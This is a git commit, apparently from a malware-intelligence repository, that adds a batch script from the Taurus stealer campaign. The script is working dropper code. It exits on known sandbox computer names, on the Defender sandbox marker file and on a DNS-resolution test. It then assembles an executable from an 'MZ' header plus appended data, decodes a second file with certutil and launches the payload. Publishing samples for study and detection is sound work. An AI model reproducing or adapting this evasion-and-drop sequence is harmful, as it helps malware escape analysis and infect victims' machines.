8448d560834cb7ef39314424e0ade824b500d23e
StrangerealIntel <54320855+StrangerealIntel@users.noreply.github.com>
2020-11-24 17:42:01 +0100

    Create Commands.cmd

---
+++ Taurus/2020-11-24/Commands.cmd
@@ -0,0 +1,20 @@
+echo zpbTWPYwB
+if %computername% == DESKTOP-QO5QU33 exit
+echo zpbTWPYwB
+if exist C:\aaa_TouchMeNot_.txt exit
+tasklist /FI "IMAGENAME eq srvpost.exe" 2>NUL | find /I /N "srvpost.exe">NUL
+if %ERRORLEVEL%==0 exit
+echo zpbTWPYwB
+if %computername% == NfZtFbPfH exit
+echo zpbTWPYwB
+if %computername% == MAIN exit
+echo zpbTWPYwB
+if %computername% == ELICZ exit
+echo zpbTWPYwB
+ping -n 1 zpbTWPYwB.zpbTWPYwB
+if %errorlevel% == 0 exit
+echo zpbTWPYwB < nul set /p = "MZ" > dllhost.com
+type 59-97 >> dllhost.com
+certutil -decode 3-31 T
+start dllhost.com T
+ping 127.0.0.1 -n 3
